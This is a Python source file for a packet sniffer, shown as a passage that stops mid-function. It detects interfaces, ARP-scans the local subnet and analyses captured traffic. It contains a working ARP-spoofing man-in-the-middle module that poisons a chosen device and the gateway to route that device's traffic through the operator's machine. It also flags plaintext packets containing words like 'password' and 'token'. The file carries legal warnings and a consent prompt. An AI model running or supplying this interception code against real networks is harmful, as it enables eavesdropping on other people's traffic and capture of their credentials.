#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║                     DECNET PACKET SNIFFER                       ║
║              Advanced Network Analysis Tool v5.0.0             ║
║                   Built for DECINT Tools                        ║
╚══════════════════════════════════════════════════════════════════╝

An advanced, user-friendly packet sniffer that can:
  - Auto-detect network interface and gateway
  - Discover all devices on your local network via ARP scan
  - Sniff packets on your own machine or target other devices on your LAN
  - Perform ARP spoofing for man-in-the-middle packet capture (your own network only)
  - Real-time packet analysis with protocol breakdown
  - DNS query logging
  - HTTP/HTTPS destination tracking
  - Export captured data to CSV/JSON/PCAP
  - Live statistics dashboard
  - Headless / non-interactive operation (cron, systemd)

REQUIREMENTS:
  sudo apt install python3-scapy nmap
  pip install scapy netifaces --break-system-packages   # netifaces optional in v5

MUST RUN AS ROOT:
  sudo python3 decnet_sniffer.py

⚠️  FOR AUTHORIZED USE ON YOUR OWN NETWORK ONLY ⚠️
Unauthorized network interception is illegal under the Canadian Criminal
Code and the U.S. Computer Fraud and Abuse Act. Only use on networks you
own or have explicit written authorization to test.

────────────────────────────────────────────────────────────────────
CHANGELOG v4.0 → v5.0.0
────────────────────────────────────────────────────────────────────
STABILITY
  • Capture now uses scapy AsyncSniffer so Ctrl+C is responsive even on a
    silent network (v4 only stopped when the next packet arrived).
  • analyze_packet() is fully guarded — a single malformed packet can no
    longer terminate an entire capture session.
  • IP forwarding: original /proc value is read and restored on cleanup
    instead of being blindly forced back to 0.
  • netifaces is now OPTIONAL. If it is missing or fails to import, the
    tool falls back to scapy for interface + gateway detection, so it runs
    on modern Python (3.12+) where netifaces frequently fails to build.
  • Thread-safe console output via a global print lock (spoof thread and
    sniff callback no longer interleave).
  • Narrowed bare `except:` clauses so KeyboardInterrupt/SystemExit are
    never swallowed.
  • Hostname resolution during discovery uses a short socket timeout to
    avoid long stalls on non-resolving hosts.
  • Fixed name shadowing: export payload no longer overwrites export_data().
  • Packet store is soft-bounded with a warning past 200k packets to avoid
    unbounded memory growth on long captures.

UPGRADES
  • Headless mode via CLI flags (--iface/--target/--duration/--count/
    --filter/--scan/--no-menu/--quiet) for cron/systemd use.
  • OUI vendor lookup merges nmap-mac-prefixes (thousands of vendors) when
    available, falling back to the built-in table.
  • Live capture packet-rate shown in statistics.
"""

import sys
import os
import signal
import time
import threading
import json
import csv
import socket
import struct
import argparse
import subprocess
from datetime import datetime
from collections import defaultdict, Counter

VERSION = "5.0.0"

# ─── Dependency Check ─────────────────────────────────────────────
HAVE_NETIFACES = False


def check_dependencies():
    """Verify hard requirements. scapy is required; netifaces is optional."""
    global HAVE_NETIFACES
    missing_hard = []
    try:
        from scapy.all import conf  # noqa: F401
    except ImportError:
        missing_hard.append("scapy")

    try:
        import netifaces  # noqa: F401
        HAVE_NETIFACES = True
    except ImportError:
        HAVE_NETIFACES = False

    if missing_hard:
        print("\n╔══════════════════════════════════════════════════╗")
        print("║          MISSING DEPENDENCIES DETECTED           ║")
        print("╠══════════════════════════════════════════════════╣")
        for m in missing_hard:
            print(f"║  ✗ {m:<44} ║")
        print("╠══════════════════════════════════════════════════╣")
        print("║  Install with:                                   ║")
        print("║  sudo apt install python3-scapy                  ║")
        print("║  pip install scapy --break-system-packages       ║")
        print("╚══════════════════════════════════════════════════╝")
        sys.exit(1)


check_dependencies()

from scapy.all import (  # noqa: E402
    ARP, Ether, IP, TCP, UDP, DNS, DNSQR, ICMP, Raw,
    srp, send, conf, wrpcap, AsyncSniffer,
    get_if_addr, get_if_list,
)

if HAVE_NETIFACES:
    import netifaces  # noqa: E402


# ═══════════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ═══════════════════════════════════════════════════════════════════
class SnifferState:
    """Centralized state management for the sniffer."""
    def __init__(self):
        self.running = False
        self.arp_spoofing = False
        self.packets_captured = 0
        self.capture_start = None
        self.captured_packets = []
        self.dns_queries = []
        self.connections = defaultdict(
            lambda: {"count": 0, "bytes": 0, "first_seen": None, "last_seen": None}
        )
        self.protocol_stats = Counter()
        self.port_stats = Counter()
        self.target_ip = None
        self.target_mac = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.interface = None
        self.my_ip = None
        self.my_mac = None
        self.netmask = None
        self.devices = []
        self.verbose = True
        self.lock = threading.Lock()
        self.spoof_thread = None
        self.async_sniffer = None
        self.pcap_file = None
        self.orig_ip_forward = None          # original /proc value, restored on cleanup
        self.max_store_warned = False
        self.alert_keywords = [
            "password", "passwd", "login", "credential",
            "token", "secret", "apikey", "api_key",
        ]


STATE = SnifferState()

# Guards concurrent writes to stdout from the spoof thread + sniff callback.
PRINT_LOCK = threading.Lock()

# Soft cap: warn (once) when the in-memory packet store crosses this.
SOFT_STORE_LIMIT = 200_000


# ═══════════════════════════════════════════════════════════════════
#  DISPLAY UTILITIES
# ═══════════════════════════════════════════════════════════════════
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BG_RED  = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_BLUE = "\033[44m"


def banner():
    """Display the main banner."""
    print(f"""
{C.CYAN}{C.BOLD}
  ██████╗ ███████╗ ██████╗███╗   ██╗███████╗████████╗
  ██╔══██╗██╔════╝██╔════╝████╗  ██║██╔════╝╚══██╔══╝
  ██║  ██║█████╗  ██║     ██╔██╗ ██║█████╗     ██║
  ██║  ██║██╔══╝  ██║     ██║╚██╗██║██╔══╝     ██║
  ██████╔╝███████╗╚██████╗██║ ╚████║███████╗   ██║
  ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═══╝╚══════╝   ╚═╝
{C.RESET}
{C.DIM}  ───────────────────────────────────────────────────
{C.WHITE}  Advanced Network Packet Sniffer v{VERSION}
{C.DIM}  Built for DECINT Tools | decint.tools
  ───────────────────────────────────────────────────{C.RESET}
""")


def msg(icon, text, color=C.WHITE):
    """Print a formatted, timestamped, thread-safe message."""
    ts = datetime.now().strftime("%H:%M:%S")
    with PRINT_LOCK:
        print(f"  {C.DIM}[{ts}]{C.RESET} {color}{icon}{C.RESET} {text}")


def msg_info(text):    msg("ℹ", text, C.BLUE)
def msg_ok(text):      msg("✓", text, C.GREEN)
def msg_warn(text):    msg("⚠", text, C.YELLOW)
def msg_err(text):     msg("✗", text, C.RED)
def msg_alert(text):   msg("🚨", f"{C.BG_RED}{C.WHITE} ALERT {C.RESET} {C.RED}{text}{C.RESET}")
def msg_packet(text):  msg("→", text, C.CYAN)
def msg_dns(text):     msg("🔍", text, C.MAGENTA)


def divider(title=""):
    """Print a section divider."""
    with PRINT_LOCK:
        if title:
            print(f"\n  {C.DIM}{'─' * 10}{C.RESET} {C.BOLD}{title}{C.RESET} "
                  f"{C.DIM}{'─' * max(0, 45 - len(title))}{C.RESET}")
        else:
            print(f"  {C.DIM}{'─' * 57}{C.RESET}")


def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')


# ═══════════════════════════════════════════════════════════════════
#  ROOT CHECK
# ═══════════════════════════════════════════════════════════════════
def check_root():
    """Verify script is running as root."""
    if os.geteuid() != 0:
        print(f"\n  {C.RED}{C.BOLD}ERROR: This tool must be run as root!{C.RESET}")
        print(f"  {C.YELLOW}Run with: sudo python3 {sys.argv[0]}{C.RESET}\n")
        sys.exit(1)
    msg_ok("Running with root privileges")


# ═══════════════════════════════════════════════════════════════════
#  NETWORK INTERFACE DETECTION  (netifaces with scapy fallback)
# ═══════════════════════════════════════════════════════════════════
def _iface_details_netifaces():
    """Enumerate interfaces via netifaces."""
    interfaces = []
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            ipv4 = addrs[netifaces.AF_INET][0]
            ip = ipv4.get('addr', 'N/A')
            netmask = ipv4.get('netmask', 'N/A')
            if ip.startswith("127."):
                continue
            mac = "N/A"
            if netifaces.AF_LINK in addrs:
                mac = addrs[netifaces.AF_LINK][0].get('addr', 'N/A')
            interfaces.append({"name": iface, "ip": ip, "netmask": netmask, "mac": mac})
    return interfaces


def _iface_mac_from_sysfs(iface):
    """Best-effort MAC read from /sys (Linux) without netifaces."""
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip() or "N/A"
    except OSError:
        return "N/A"


def _iface_netmask_from_ip_cmd(iface):
    """Best-effort netmask via `ip` command; returns dotted-quad or 'N/A'."""
    try:
        out = subprocess.run(
            ["ip", "-o", "-f", "inet", "addr", "show", iface],
            capture_output=True, text=True, timeout=5,
        ).stdout
        # Format: "2: eth0    inet 192.168.1.5/24 brd ..."
        for token in out.split():
            if "/" in token and token.count(".") == 3:
                prefix = int(token.split("/")[1])
                mask = (0xffffffff >> (32 - prefix)) << (32 - prefix) if prefix else 0
                return socket.inet_ntoa(struct.pack("!I", mask))
    except (OSError, ValueError, subprocess.SubprocessError):
        pass
    return "N/A"


def _iface_details_scapy():
    """Enumerate interfaces via scapy when netifaces is unavailable."""
    interfaces = []
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
        except Exception:
            ip = "0.0.0.0"
        if not ip or ip in ("0.0.0.0", "127.0.0.1") or ip.startswith("127."):
            continue
        interfaces.append({
            "name": iface,
            "ip": ip,
            "netmask": _iface_netmask_from_ip_cmd(iface),
            "mac": _iface_mac_from_sysfs(iface),
        })
    return interfaces


def detect_interfaces(preferred=None):
    """Detect available interfaces. If `preferred` is given, auto-select it."""
    divider("NETWORK INTERFACE DETECTION")
    if HAVE_NETIFACES:
        msg_info("Scanning for active network interfaces (netifaces)...")
        interfaces = _iface_details_netifaces()
    else:
        msg_warn("netifaces not available — using scapy fallback for detection.")
        interfaces = _iface_details_scapy()

    if not interfaces:
        msg_err("No active network interfaces found!")
        sys.exit(1)

    # Headless / preferred selection
    if preferred:
        for iface in interfaces:
            if iface["name"] == preferred:
                _apply_interface(iface)
                return iface
        msg_err(f"Requested interface '{preferred}' not found among active interfaces.")
        sys.exit(1)

    print()
    print(f"  {C.BOLD}{'#':<4} {'Interface':<15} {'IP Address':<18} {'MAC Address':<20} {'Netmask'}{C.RESET}")
    print(f"  {C.DIM}{'─' * 75}{C.RESET}")
    for i, iface in enumerate(interfaces, 1):
        print(f"  {C.CYAN}{i:<4}{C.RESET} {iface['name']:<15} {iface['ip']:<18} "
              f"{iface['mac']:<20} {iface['netmask']}")
    print()

    if len(interfaces) == 1:
        msg_ok(f"Auto-selected interface: {interfaces[0]['name']} ({interfaces[0]['ip']})")
        selected = interfaces[0]
    else:
        while True:
            try:
                choice = input(f"  {C.YELLOW}Select interface [1-{len(interfaces)}]: {C.RESET}").strip()
                idx = int(choice) - 1
                if 0 <= idx < len(interfaces):
                    selected = interfaces[idx]
                    break
                msg_err("Invalid selection, try again.")
            except ValueError:
                msg_err("Please enter a number.")
            except (KeyboardInterrupt, EOFError):
                print()
                cleanup_and_exit()

    _apply_interface(selected)
    return selected


def _apply_interface(selected):
    STATE.interface = selected['name']
    STATE.my_ip = selected['ip']
    STATE.my_mac = selected['mac']
    STATE.netmask = selected.get('netmask', 'N/A')
    conf.iface = STATE.interface
    msg_ok(f"Interface: {STATE.interface}")
    msg_ok(f"Your IP:   {STATE.my_ip}")
    msg_ok(f"Your MAC:  {STATE.my_mac}")


def _default_gateway_scapy():
    """Return default gateway IP via scapy's routing table, or None."""
    try:
        # conf.route.route returns (iface, output_ip, gateway) for a destination
        _, _, gw = conf.route.route("0.0.0.0")
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        pass
    return None


def detect_gateway():
    """Detect the default gateway and resolve its MAC."""
    divider("GATEWAY DETECTION")
    msg_info("Detecting default gateway...")

    gw_ip = None
    if HAVE_NETIFACES:
        gateways = netifaces.gateways()
        default_gw = gateways.get('default', {}).get(netifaces.AF_INET)
        if default_gw:
            gw_ip = default_gw[0]
    if not gw_ip:
        gw_ip = _default_gateway_scapy()

    if gw_ip:
        STATE.gateway_ip = gw_ip
        msg_ok(f"Gateway IP: {STATE.gateway_ip}")
        msg_info("Resolving gateway MAC address via ARP...")
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=STATE.gateway_ip),
                         timeout=3, verbose=0, iface=STATE.interface)
            if ans:
                STATE.gateway_mac = ans[0][1].hwsrc
                msg_ok(f"Gateway MAC: {STATE.gateway_mac}")
            else:
                msg_warn("Could not resolve gateway MAC. ARP spoofing will not be available.")
        except Exception as e:
            msg_warn(f"ARP resolution failed: {e}")
    else:
        msg_warn("No default gateway detected. Manual entry required.")
        try:
            STATE.gateway_ip = input(f"  {C.YELLOW}Enter gateway IP: {C.RESET}").strip() or None
        except (KeyboardInterrupt, EOFError):
            print()


# ═══════════════════════════════════════════════════════════════════
#  NETWORK DEVICE DISCOVERY
# ═══════════════════════════════════════════════════════════════════
_BUILTIN_OUI = {
    "00:50:56": "VMware", "00:0c:29": "VMware", "00:1a:2b": "Cisco",
    "00:25:00": "Apple", "3c:22:fb": "Apple", "a4:83:e7": "Apple",
    "f8:ff:c2": "Apple", "ac:de:48": "Apple", "dc:a6:32": "Raspberry Pi",
    "b8:27:eb": "Raspberry Pi", "e4:5f:01": "Raspberry Pi", "00:e0:4c": "Realtek",
    "52:54:00": "QEMU/KVM", "08:00:27": "VirtualBox", "f0:de:f1": "Google",
    "54:60:09": "Google", "00:1e:67": "Intel", "a0:36:9f": "Intel",
    "00:15:5d": "Microsoft Hyper-V", "44:44:44": "TP-Link", "50:c7:bf": "TP-Link",
    "b0:be:76": "TP-Link", "c0:25:e9": "TP-Link", "30:b5:c2": "TP-Link",
    "c0:56:27": "Belkin", "08:86:3b": "Belkin", "00:1f:33": "Netgear",
    "a4:2b:8c": "Netgear", "e8:fc:af": "Netgear", "20:aa:4b": "Linksys",
    "c0:a0:bb": "D-Link", "1c:7e:e5": "D-Link", "98:de:d0": "TP-Link",
    "fc:ec:da": "Ubiquiti", "b4:fb:e4": "Ubiquiti", "24:a4:3c": "Ubiquiti",
    "00:26:f2": "Netgear", "d8:3a:dd": "Roku", "b0:a7:b9": "Roku",
    "b8:c1:11": "Samsung", "f0:5c:d5": "Samsung", "cc:2d:b7": "Samsung",
}

# Populated lazily from nmap-mac-prefixes if present.
_OUI_DB = None


def _load_oui_db():
    """Build the OUI lookup once, merging nmap-mac-prefixes when available."""
    global _OUI_DB
    if _OUI_DB is not None:
        return _OUI_DB
    db = dict(_BUILTIN_OUI)
    for path in ("/usr/share/nmap/nmap-mac-prefixes",
                 "/usr/local/share/nmap/nmap-mac-prefixes"):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = line.split(None, 1)
                    if len(parts) != 2:
                        continue
                    raw, vendor = parts
                    if len(raw) < 6:
                        continue
                    # nmap format is 6 hex chars: AABBCC
                    prefix = f"{raw[0:2]}:{raw[2:4]}:{raw[4:6]}".lower()
                    db.setdefault(prefix, vendor.strip())
            break
        except OSError:
            continue
    _OUI_DB = db
    return db


def get_mac_vendor(mac):
    """Identify device vendor from MAC OUI prefix."""
    db = _load_oui_db()
    prefix = mac[:8].lower()
    return db.get(prefix, "Unknown")


def discover_network():
    """Perform ARP scan to discover all devices on the network."""
    divider("NETWORK DEVICE DISCOVERY")
    if not STATE.my_ip:
        msg_err("No local IP known; cannot compute subnet.")
        return []
    msg_info("Performing ARP scan to discover devices on the network...")
    msg_info("This may take 10-30 seconds depending on network size...")
    print()

    ip_parts = STATE.my_ip.split(".")
    subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
    msg_info(f"Scanning subnet: {subnet}")

    # Short-lived socket timeout so reverse-DNS lookups can't stall the scan.
    prev_timeout = socket.getdefaulttimeout()
    socket.setdefaulttimeout(1.0)
    try:
        ans, unans = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
            timeout=5, verbose=0, iface=STATE.interface, retry=2,
        )

        devices = []
        for sent, received in ans:
            ip = received.psrc
            mac = received.hwsrc
            vendor = get_mac_vendor(mac)
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except (socket.herror, socket.gaierror, socket.timeout, OSError):
                hostname = "N/A"

            tag = ""
            if ip == STATE.gateway_ip:
                tag = f" {C.GREEN}[GATEWAY]{C.RESET}"
            elif ip == STATE.my_ip:
                tag = f" {C.BLUE}[YOU]{C.RESET}"

            devices.append({"ip": ip, "mac": mac, "vendor": vendor,
                            "hostname": hostname, "tag": tag})

        devices.sort(key=lambda d: struct.unpack("!I", socket.inet_aton(d['ip']))[0])
        STATE.devices = devices

        msg_ok(f"Discovered {len(devices)} device(s) on the network\n")
        print(f"  {C.BOLD}{'#':<4} {'IP Address':<18} {'MAC Address':<20} {'Vendor':<16} {'Hostname'}{C.RESET}")
        print(f"  {C.DIM}{'─' * 80}{C.RESET}")
        for i, dev in enumerate(devices, 1):
            vendor_display = dev['vendor'][:14]
            hostname_display = dev['hostname'][:25] if dev['hostname'] != "N/A" else C.DIM + "N/A" + C.RESET
            print(f"  {C.CYAN}{i:<4}{C.RESET} {dev['ip']:<18} {dev['mac']:<20} "
                  f"{vendor_display:<16} {hostname_display}{dev['tag']}")
        print()
        return devices

    except Exception as e:
        msg_err(f"Network scan failed: {e}")
        return []
    finally:
        socket.setdefaulttimeout(prev_timeout)


# ═══════════════════════════════════════════════════════════════════
#  ARP SPOOFING (for targeting other devices on YOUR network)
# ═══════════════════════════════════════════════════════════════════
def enable_ip_forwarding():
    """Enable IP forwarding, remembering the original value for restore."""
    msg_info("Enabling IP forwarding...")
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            STATE.orig_ip_forward = f.read().strip()
    except OSError:
        STATE.orig_ip_forward = None
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        msg_ok(f"IP forwarding enabled (was: {STATE.orig_ip_forward or 'unknown'})")
    except OSError as e:
        msg_err(f"Failed to enable IP forwarding: {e}")
        msg_warn("Packets may not flow correctly through this machine")


def disable_ip_forwarding():
    """Restore IP forwarding to its original value (default 0 if unknown)."""
    restore_val = STATE.orig_ip_forward if STATE.orig_ip_forward in ("0", "1") else "0"
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(restore_val)
        msg_ok(f"IP forwarding restored to {restore_val}")
    except OSError:
        pass


def arp_spoof(target_ip, target_mac, spoof_ip):
    """Send a single ARP spoof packet."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)


def arp_restore(target_ip, target_mac, source_ip, source_mac):
    """Restore the ARP table to its legitimate state."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=5, verbose=0)


def spoof_loop():
    """Continuous ARP spoofing loop — runs in a background thread."""
    msg_info("ARP spoof thread started — poisoning every 2 seconds")
    while STATE.arp_spoofing:
        try:
            arp_spoof(STATE.target_ip, STATE.target_mac, STATE.gateway_ip)
            arp_spoof(STATE.gateway_ip, STATE.gateway_mac, STATE.target_ip)
            time.sleep(2)
        except Exception as e:
            msg_err(f"ARP spoof error: {e}")
            time.sleep(5)


def start_arp_spoofing():
    """Start the ARP spoofing attack in a background thread."""
    if not STATE.target_mac or not STATE.gateway_mac:
        msg_err("Cannot start ARP spoofing without target MAC and gateway MAC")
        return False
    enable_ip_forwarding()
    STATE.arp_spoofing = True
    STATE.spoof_thread = threading.Thread(target=spoof_loop, daemon=True)
    STATE.spoof_thread.start()
    msg_ok(f"ARP spoofing active: {STATE.target_ip} ↔ {STATE.gateway_ip}")
    return True


def stop_arp_spoofing():
    """Stop ARP spoofing and restore ARP tables."""
    if STATE.arp_spoofing:
        msg_info("Stopping ARP spoofing...")
        STATE.arp_spoofing = False
        if STATE.spoof_thread:
            STATE.spoof_thread.join(timeout=5)
        msg_info("Restoring ARP tables (this may take a moment)...")
        try:
            arp_restore(STATE.target_ip, STATE.target_mac, STATE.gateway_ip, STATE.gateway_mac)
            arp_restore(STATE.gateway_ip, STATE.gateway_mac, STATE.target_ip, STATE.target_mac)
            msg_ok("ARP tables restored")
        except Exception as e:
            msg_warn(f"ARP restore error: {e}")
        disable_ip_forwarding()
        msg_ok("ARP spoofing stopped and cleaned up")


# ═══════════════════════════════════════════════════════════════════
#  PACKET ANALYSIS ENGINE
# ═══════════════════════════════════════════════════════════════════
def analyze_packet(packet):
    """Analyze a single captured packet. Fully guarded: never raises."""
    try:
        _analyze_packet_inner(packet)
    except Exception as e:
        # A malformed/unexpected packet must never kill the capture loop.
        if STATE.verbose:
            msg_warn(f"packet parse skipped: {e}")


def _analyze_packet_inner(packet):
    with STATE.lock:
        STATE.packets_captured += 1
        STATE.captured_packets.append(packet)
        count = STATE.packets_captured
        if count > SOFT_STORE_LIMIT and not STATE.max_store_warned:
            STATE.max_store_warned = True
            warn_now = True
        else:
            warn_now = False
    if warn_now:
        msg_warn(f"In-memory packet store passed {SOFT_STORE_LIMIT:,}. "
                 f"Consider exporting/resetting to limit memory use.")

    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]

    # ── Layer 3 (IP) ──
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        pkt_len = len(packet)

        proto_name = "OTHER"
        detail = ""
        color = C.WHITE

        # ── DNS ──
        if packet.haslayer(DNS) and packet.haslayer(DNSQR) and packet[DNS].qdcount > 0:
            proto_name = "DNS"
            color = C.MAGENTA
            try:
                qname = packet[DNSQR].qname.decode(errors='ignore').rstrip('.')
            except (AttributeError, UnicodeDecodeError):
                qname = "<unparseable>"
            qtype_map = {1: "A", 2: "NS", 5: "CNAME", 15: "MX", 16: "TXT",
                         28: "AAAA", 33: "SRV", 255: "ANY"}
            qtype = qtype_map.get(packet[DNSQR].qtype, str(packet[DNSQR].qtype))

            if packet[DNS].qr == 0:
                detail = f"QUERY {qtype} {qname}"
                with STATE.lock:
                    STATE.dns_queries.append({"time": timestamp, "src": src_ip,
                                              "query": qname, "type": qtype})
            else:
                ans_count = packet[DNS].ancount
                detail = f"RESPONSE {qtype} {qname} ({ans_count} answers)"

            if STATE.verbose:
                msg_dns(f"{detail}")

        # ── TCP ──
        elif packet.haslayer(TCP):
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flags = packet[TCP].flags

            services = {
                80: "HTTP", 443: "HTTPS", 22: "SSH", 21: "FTP",
                23: "TELNET", 25: "SMTP", 53: "DNS", 110: "POP3",
                143: "IMAP", 993: "IMAPS", 995: "POP3S", 3389: "RDP",
                8080: "HTTP-ALT", 8443: "HTTPS-ALT", 3306: "MySQL",
                5432: "PostgreSQL", 6379: "Redis", 27017: "MongoDB",
                445: "SMB", 139: "NetBIOS", 1723: "PPTP", 5060: "SIP",
                5900: "VNC", 6667: "IRC", 9200: "Elasticsearch",
            }
            service = services.get(dport, services.get(sport, "TCP"))
            proto_name = service
            color = C.GREEN if dport == 443 else C.YELLOW if dport == 80 else C.CYAN

            flag_str = str(flags)
            if 'S' in flag_str and 'A' not in flag_str:
                detail = f"SYN → {src_ip}:{sport} → {dst_ip}:{dport}"
                color = C.GREEN
            elif 'S' in flag_str and 'A' in flag_str:
                detail = f"SYN-ACK ← {src_ip}:{sport} → {dst_ip}:{dport}"
            elif 'F' in flag_str:
                detail = f"FIN {src_ip}:{sport} → {dst_ip}:{dport}"
                color = C.YELLOW
            elif 'R' in flag_str:
                detail = f"RST {src_ip}:{sport} → {dst_ip}:{dport}"
                color = C.RED
            else:
                detail = f"{src_ip}:{sport} → {dst_ip}:{dport} [{flag_str}]"

            with STATE.lock:
                STATE.port_stats[dport] += 1

            # ── Payload Inspection (unencrypted traffic) ──
            if packet.haslayer(Raw):
                payload = packet[Raw].load
                try:
                    decoded = payload.decode('utf-8', errors='ignore').lower()
                    for keyword in STATE.alert_keywords:
                        if keyword in decoded:
                            msg_alert(f"Sensitive keyword '{keyword}' detected in plaintext traffic!")
                            msg_alert(f"  Source: {src_ip}:{sport} → {dst_ip}:{dport}")
                            break

                    if decoded.startswith(("get ", "post ", "put ", "delete ", "head ", "options ")):
                        lines = decoded.split('\r\n')
                        method_line = lines[0][:80]
                        host = ""
                        for line in lines:
                            if line.startswith("host:"):
                                host = line.split(":", 1)[1].strip()
                                break
                        detail = f"HTTP {method_line} (Host: {host})" if host else f"HTTP {method_line}"
                        color = C.YELLOW
                        proto_name = "HTTP"
                except (UnicodeDecodeError, ValueError):
                    pass

        # ── UDP ──
        elif packet.haslayer(UDP):
            sport = packet[UDP].sport
            dport = packet[UDP].dport
            proto_name = "UDP"
            color = C.BLUE
            detail = f"{src_ip}:{sport} → {dst_ip}:{dport}"
            with STATE.lock:
                STATE.port_stats[dport] += 1

        # ── ICMP ──
        elif packet.haslayer(ICMP):
            proto_name = "ICMP"
            color = C.YELLOW
            icmp_types = {0: "Echo Reply", 3: "Dest Unreachable",
                          8: "Echo Request", 11: "TTL Exceeded"}
            icmp_type = icmp_types.get(packet[ICMP].type, f"Type {packet[ICMP].type}")
            detail = f"{icmp_type} {src_ip} → {dst_ip}"

        # ── Update Stats ──
        with STATE.lock:
            STATE.protocol_stats[proto_name] += 1
            conn_key = f"{src_ip} → {dst_ip}"
            STATE.connections[conn_key]["count"] += 1
            STATE.connections[conn_key]["bytes"] += pkt_len
            STATE.connections[conn_key]["last_seen"] = timestamp
            if not STATE.connections[conn_key]["first_seen"]:
                STATE.connections[conn_key]["first_seen"] = timestamp

        # ── Display ──
        if STATE.verbose and proto_name != "DNS":
            proto_label = f"{color}{proto_name:<8}{C.RESET}"
            with PRINT_LOCK:
                print(f"  {C.DIM}{timestamp}{C.RESET} {proto_label} "
                      f"{C.DIM}#{count:<6}{C.RESET} {detail}  {C.DIM}({pkt_len}B){C.RESET}")

    # ── ARP Layer ──
    elif packet.haslayer(ARP):
        with STATE.lock:
            STATE.protocol_stats["ARP"] += 1
        if STATE.verbose:
            with PRINT_LOCK:
                if packet[ARP].op == 1:
                    print(f"  {C.DIM}{timestamp}{C.RESET} {C.YELLOW}ARP     {C.RESET} "
                          f"Who has {packet[ARP].pdst}? Tell {packet[ARP].psrc}")
                elif packet[ARP].op == 2:
                    print(f"  {C.DIM}{timestamp}{C.RESET} {C.YELLOW}ARP     {C.RESET} "
                          f"{packet[ARP].psrc} is at {packet[ARP].hwsrc}")


# ═══════════════════════════════════════════════════════════════════
#  CAPTURE ENGINE (AsyncSniffer — responsive stop on quiet networks)
# ═══════════════════════════════════════════════════════════════════
def _run_async_capture(kwargs):
    """Run an AsyncSniffer and block until it stops or the user interrupts."""
    sniffer = AsyncSniffer(**kwargs)
    STATE.async_sniffer = sniffer
    STATE.running = True
    STATE.capture_start = datetime.now()
    sniffer.start()
    try:
        # Poll instead of blocking in sniff(): lets Ctrl+C stop us immediately,
        # even if not a single packet is arriving.
        while STATE.running and getattr(sniffer, "running", False):
            time.sleep(0.2)
    except KeyboardInterrupt:
        pass
    finally:
        STATE.running = False
        try:
            sniffer.stop()
        except Exception:
            pass
        try:
            sniffer.join(timeout=3)
        except Exception:
            pass
        STATE.async_sniffer = None


def capture_own_traffic(duration=0, packet_count=0, bpf_filter=""):
    """Capture packets on the local machine's interface."""
    divider("CAPTURING LOCAL TRAFFIC")
    msg_ok(f"Sniffing on interface: {STATE.interface}")
    if bpf_filter:
        msg_info(f"BPF Filter: {bpf_filter}")
    if duration > 0:
        msg_info(f"Duration: {duration} seconds")
    if packet_count > 0:
        msg_info(f"Max packets: {packet_count}")
    msg_info(f"Press {C.BOLD}Ctrl+C{C.RESET} to stop capture\n")

    kwargs = {"iface": STATE.interface, "prn": analyze_packet, "store": 0}
    if bpf_filter:
        kwargs["filter"] = bpf_filter
    if packet_count > 0:
        kwargs["count"] = packet_count
    if duration > 0:
        kwargs["timeout"] = duration

    _run_async_capture(kwargs)
    print()
    msg_ok(f"Capture stopped. {STATE.packets_captured} packets captured.")


def capture_target_traffic(duration=0, packet_count=0, bpf_filter=""):
    """Capture traffic from a target device via ARP spoofing."""
    divider("CAPTURING TARGET TRAFFIC (ARP MITM)")

    if not STATE.target_ip or not STATE.target_mac:
        msg_err("No target selected!")
        return
    if not STATE.gateway_mac:
        msg_err("Gateway MAC not resolved. Cannot perform ARP spoofing.")
        return

    print()
    print(f"  {C.BOLD}┌─────────────────────────────────────────────┐{C.RESET}")
    print(f"  {C.BOLD}│{C.RESET}  Target:  {STATE.target_ip:<18} ({STATE.target_mac}) {C.BOLD}│{C.RESET}")
    print(f"  {C.BOLD}│{C.RESET}  Gateway: {STATE.gateway_ip:<18} ({STATE.gateway_mac}) {C.BOLD}│{C.RESET}")
    print(f"  {C.BOLD}│{C.RESET}  Mode:    ARP Spoof MITM                     {C.BOLD}│{C.RESET}")
    print(f"  {C.BOLD}└─────────────────────────────────────────────┘{C.RESET}")
    print()

    msg_warn("This intercepts traffic from the target device through your machine.")
    msg_warn("Only use on networks you own or are authorized to test!")
    print()

    try:
        confirm = input(f"  {C.YELLOW}Proceed with ARP spoofing? (yes/no): {C.RESET}").strip().lower()
    except (KeyboardInterrupt, EOFError):
        print()
        return
    if confirm not in ("yes", "y"):
        msg_info("Cancelled.")
        return

    print()
    msg_info("Starting ARP spoofing...")
    if not start_arp_spoofing():
        return

    target_filter = f"host {STATE.target_ip}"
    if bpf_filter:
        target_filter = f"({target_filter}) and ({bpf_filter})"
    msg_ok(f"Filter: {target_filter}")
    msg_info(f"Press {C.BOLD}Ctrl+C{C.RESET} to stop capture\n")

